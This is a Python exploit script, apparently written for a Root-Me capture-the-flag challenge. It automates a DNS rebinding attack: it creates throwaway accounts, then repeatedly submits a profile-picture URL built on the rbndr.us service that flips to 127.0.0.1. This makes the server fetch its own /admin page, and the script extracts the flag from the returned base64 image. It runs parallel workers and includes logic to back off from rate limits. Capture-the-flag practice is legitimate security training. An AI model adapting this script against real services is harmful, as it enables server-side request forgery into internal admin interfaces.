#!/usr/bin/env python3
import requests
import re
import base64
import uuid
import concurrent.futures
import threading
import time

BASE_URL = "https://instance-019c1dbd-d0a8-7399-8a92-e80e035fcedf.challenges.root-me.pro"

success_flag = threading.Event()
found_flag = None
lock = threading.Lock()
attempt_counter = 0
session_lock = threading.Lock()  # To prevent parallel session creation

def create_session():
    """Create a new session with a unique user - with rate limiting"""
    with session_lock:  # Only one session creation at a time
        try:
            time.sleep(0.5)  # Small delay to avoid rate limiting
            session = requests.Session()
            session.headers.update({'User-Agent': 'Mozilla/5.0'})
            username = f"u_{uuid.uuid4().hex[:8]}"
            password = "pass123"

            r1 = session.post(f"{BASE_URL}/register", data={"username": username, "password": password}, timeout=10)
            if r1.status_code != 200:
                print(f"[!] Register failed: {r1.status_code}")
                return None

            time.sleep(0.3)
            r2 = session.post(f"{BASE_URL}/login", data={"username": username, "password": password}, timeout=10)

            if r2.status_code == 200 and "logout" in r2.text.lower():
                return session
            else:
                print(f"[!] Login failed: {r2.status_code}")
                return None
        except Exception as e:
            print(f"[!] Session error: {e}")
            return None

def try_rebind(session, worker_id):
    """Try a single DNS rebinding attempt"""
    global found_flag, attempt_counter

    if success_flag.is_set():
        return None

    unique_id = uuid.uuid4().hex[:8]
    rebind_url = f"http://{unique_id}.7f000001.08080808.rbndr.us/admin"

    try:
        r1 = session.post(f"{BASE_URL}/update-pp", data={"pp-url": rebind_url}, timeout=20)
        if r1.status_code == 503:
            print("[!] Rate limited, backing off...")
            time.sleep(2)
            return None

        time.sleep(0.3)
        r = session.get(f"{BASE_URL}/", timeout=10)

        match = re.search(r'<img src="data:image/png;base64,([^"]+)"', r.text)
        if match:
            b64_content = match.group(1)
            try:
                decoded = base64.b64decode(b64_content).decode('utf-8', errors='ignore')

                # Look for flag
                flag_match = re.search(r'RM\{[^}]+\}', decoded)
                if flag_match:
                    with lock:
                        found_flag = flag_match.group(0)
                        success_flag.set()
                    return flag_match.group(0)

                # Check for admin page or flag keyword
                if ("flag" in decoded.lower() or "congrats" in decoded.lower()) and len(decoded) > 200:
                    with lock:
                        if not found_flag:
                            found_flag = decoded[:2000]
                            success_flag.set()
                    return decoded
            except:
                pass
    except Exception as e:
        if "503" in str(e):
            time.sleep(2)

    with lock:
        attempt_counter += 1
        if attempt_counter % 20 == 0:
            print(f"\r[Attempts: {attempt_counter}]", end="", flush=True)

    return None

def worker(worker_id):
    """Worker that tries rebinding"""
    try:
        print(f"[Worker {worker_id}] Creating session...")
        session = create_session()
        if not session:
            print(f"[Worker {worker_id}] Failed to create session")
            return

        print(f"[Worker {worker_id}] Started - attacking...")
        local_attempts = 0

        while not success_flag.is_set() and local_attempts < 300:
            local_attempts += 1
            result = try_rebind(session, worker_id)

            if result:
                print(f"\n[Worker {worker_id}] SUCCESS at attempt {local_attempts}!")
                return

            time.sleep(0.2)  # Small delay between attempts

            # Refresh session periodically
            if local_attempts % 50 == 0:
                print(f"\n[Worker {worker_id}] Refreshing session at {local_attempts} attempts...")
                new_session = create_session()
                if new_session:
                    session = new_session

    except Exception as e:
        print(f"\n[Worker {worker_id}] Error: {e}")

def main():
    print(f"[*] DNS Rebinding attack on {BASE_URL}")
    print("[*] Using rbndr.us service with rate limiting protection")
    print("[*] Starting 4 workers sequentially...")

    num_workers = 4  # Reduced to avoid rate limiting

    with concurrent.futures.ThreadPoolExecutor(max_workers=num_workers) as executor:
        # Start workers with delays to avoid overwhelming the server
        futures = []
        for i in range(num_workers):
            futures.append(executor.submit(worker, i))
            time.sleep(1)  # Delay between starting workers

        try:
            concurrent.futures.wait(futures, timeout=600)
        except KeyboardInterrupt:
            print("\n[!] Interrupted")
            success_flag.set()

    print()  # New line
    if found_flag:
        print(f"\n{'='*70}")
        print(f"[!!!] FLAG CAPTURED!")
        print(f"{'='*70}")
        print(f"{found_flag}")
        print(f"{'='*70}")
    else:
        print("\n[-] Attack completed - no flag found")

if __name__ == "__main__":
    main()
